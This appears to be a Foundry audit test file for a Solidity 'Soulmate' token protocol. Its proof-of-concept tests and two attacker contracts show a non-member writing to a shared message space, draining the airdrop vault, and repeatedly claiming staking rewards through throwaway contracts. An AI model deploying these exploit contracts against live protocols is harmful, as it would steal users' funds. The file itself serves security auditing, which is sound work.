// SPDX-license-Identifier: MIT
pragma solidity ^0.8.23;

import {Test, console} from "forge-std/Test.sol";
// locals
import {Airdrop} from "../src/Airdrop.sol";
import {LoveToken} from "../src/LoveToken.sol";
import {Soulmate} from "../src/Soulmate.sol";
import {Staking} from "../src/Staking.sol";
import {Vault} from "../src/Vault.sol";
import {ILoveToken} from "../src/interface/ILoveToken.sol";
import {ISoulmate} from "../src/interface/ISoulmate.sol";
import {IVault} from "../src/interface/IVault.sol";

contract ProtocolAudit is Test {
    Airdrop airdropContract;
    LoveToken loveTokenContract;
    Soulmate soulmateContract;
    Staking stakingContract;
    Vault airdropVaultContract;
    Vault stakingVaultContract;

    address soulmate1 = makeAddr("soulmate1");
    address soulmate2 = makeAddr("soulmate2");

    function setUp() public {
        airdropVaultContract = new Vault();
        stakingVaultContract = new Vault();
        soulmateContract = new Soulmate();
        loveTokenContract = new LoveToken(ISoulmate(address(soulmateContract)), address(airdropVaultContract), address(stakingVaultContract));
        airdropContract = new Airdrop(ILoveToken(address(loveTokenContract)), ISoulmate(address(soulmateContract)), IVault(address(airdropVaultContract)));
        stakingContract = new Staking(ILoveToken(address(loveTokenContract)), ISoulmate(address(soulmateContract)), IVault(address(stakingVaultContract)));

        // let's initialize vault
        airdropVaultContract.initVault(ILoveToken(address(loveTokenContract)), address(airdropContract));
        stakingVaultContract.initVault(ILoveToken(address(loveTokenContract)), address(stakingContract));
    }

    function setUpSoulmates() public {
        vm.prank(soulmate1);
        soulmateContract.mintSoulmateToken();

        vm.prank(soulmate2);
        soulmateContract.mintSoulmateToken();
        assertEq(soulmateContract.soulmateOf(soulmate1), soulmate2);
    }

    function testNonSoulmateCanSendMessageToSharedSpaceIdZero() public {
        setUpSoulmates();
        // there should be no message since neither soulmates has sent a message
        uint256 timestamp = 3;
        vm.prank(soulmate1);
        vm.warp(timestamp);
        string memory message = soulmateContract.readMessageInSharedSpace();
        assertEq(message, ", honey");

        address notASoulmate = makeAddr("notASoulmate");

        vm.prank(notASoulmate);
        soulmateContract.writeMessageInSharedSpace("some new message");

        // let's get the message in sharedSpace[0]
        vm.prank(soulmate2);
        assertEq(message, soulmateContract.readMessageInSharedSpace());
    }

    function testNonSoulmateCanClaimUnclaimedSoulmateAirdrop() public {
        setUpSoulmates();

        address notASoulmate = makeAddr("notASoulmate");

        vm.warp(airdropContract.daysInSecond() + 1);
        vm.startPrank(notASoulmate);

        uint256 numIterations = loveTokenContract.balanceOf(address(airdropVaultContract)) / (1 * 10 ** 18); // infinite calls

        numIterations = 10000;
        
        for (uint256 i=0; i < numIterations; i++) {
            AttackAirdrop attackAirdrop = new AttackAirdrop();

            attackAirdrop.attack(address(airdropContract), address(loveTokenContract), address(soulmateContract));
        }

        console.log(loveTokenContract.balanceOf(notASoulmate));

        assertEq(loveTokenContract.balanceOf(notASoulmate), numIterations * 10 ** loveTokenContract.decimals());
        vm.stopPrank();
    }

    function testNonSoulmateCanClaimUnclaimedSoulmateStakedTokens() public {
        /**
            In a situation where
            step 1: a malicious participant is an address
            that is also a Soulmate.

            step 2: gets some LoveToken to stake from daily Airdrops

            step 3: transfer to some other address the Lovetokens and
            deposit the LoveTokens (as that other address) in Staking SC 
            so as to have a non-zero value in userStakes mapping

            step 4: claim as much rewards as possible😈
        */
        setUpSoulmates();

        address soulmate3 = makeAddr("soulmate3");

        // malicious soulmate
        address soulmate4 = makeAddr("soulmate4");

        // step 1: let's become a Soulmate
        vm.prank(soulmate3);
        soulmateContract.mintSoulmateToken();

        vm.startPrank(soulmate4);
        soulmateContract.mintSoulmateToken();

        vm.warp(1 weeks + 1);

        // step 2: let's get some LoveToken airdrop as a Soulmate
        airdropContract.claim();
        vm.stopPrank();
        uint256 loveTokenDeposit = loveTokenContract.balanceOf(soulmate4);
        assert(loveTokenDeposit > 0);

        // step 3: let's transfer & deposit the LoveTokens airdropped to us
        uint256 numIterations = loveTokenContract.balanceOf(address(stakingVaultContract)) / (1 * 10 ** 18); // infinite calls

        numIterations = 10000;
        
        // claim as much rewards as possible
        for (uint256 i=0; i < numIterations; i++) {
            /// step 4: ⚔️💰
            AttackStaking attackStaking = new AttackStaking();
            vm.startPrank(soulmate4);
            loveTokenContract.transfer(address(attackStaking), loveTokenDeposit);

            attackStaking.attack(address(stakingContract), address(soulmateContract), address(loveTokenContract));
            vm.stopPrank();
        }

        console.log(loveTokenContract.balanceOf(soulmate4));

        assertEq(loveTokenContract.balanceOf(soulmate4), ((numIterations * loveTokenDeposit * (block.timestamp - soulmateContract.idToCreationTimestamp(0))) / 1 weeks) + loveTokenDeposit);
        vm.stopPrank();
    }
}

contract AttackAirdrop {
    Airdrop airdropContract;
    LoveToken lovetokenContract;
    Soulmate soulmateContract;

    function attack(address _airdropContract, address _loveTokenContract, address _soulmateContract) public {
        airdropContract = Airdrop(_airdropContract);
        lovetokenContract = LoveToken(_loveTokenContract);
        soulmateContract = Soulmate(_soulmateContract);

        uint256 numberOfDaysInCouple = block.timestamp - soulmateContract.idToCreationTimestamp(0);

        if (numberOfDaysInCouple < airdropContract.daysInSecond()) revert("Owner already claimed!");

        airdropContract.claim();
        lovetokenContract.transfer(msg.sender, lovetokenContract.balanceOf(address(this)));
    }
}

contract AttackStaking {
    Staking stakingContract;
    Soulmate soulmateContract;
    LoveToken loveTokenContract;

    function attack(address _stakingContract, address _soulmateContract, address _loveTokenContract) public {
        stakingContract = Staking(_stakingContract);
        soulmateContract = Soulmate(_soulmateContract);
        loveTokenContract = LoveToken(_loveTokenContract);
        /**
            let's check if the difference between (block.timstamp) and 
            soulmateContract.idToCreationTimestamp(0) is >= 1 week
        */
        uint256 timeDifference = block.timestamp - soulmateContract.idToCreationTimestamp(0);

        if ((timeDifference % 1 weeks) >= 1) revert("Less than one week to exploiting!");

        uint256 loveTokenBal = loveTokenContract.balanceOf(address(this));

        // we need to have some LoveTokens in our balance to proceed with exploit
        if (loveTokenBal == 0) revert("Transfer some LoveTookens to proceed with exploit!");

        loveTokenContract.approve(address(stakingContract), loveTokenBal);
        stakingContract.deposit(loveTokenBal);

        // let's claim rewards 😈
        stakingContract.claimRewards();

        // withdrawing stakes
        stakingContract.withdraw(stakingContract.userStakes(address(this)));

        // send received tokens to msg.sender
        loveTokenContract.transfer(msg.sender, loveTokenContract.balanceOf(address(this)));
    }
}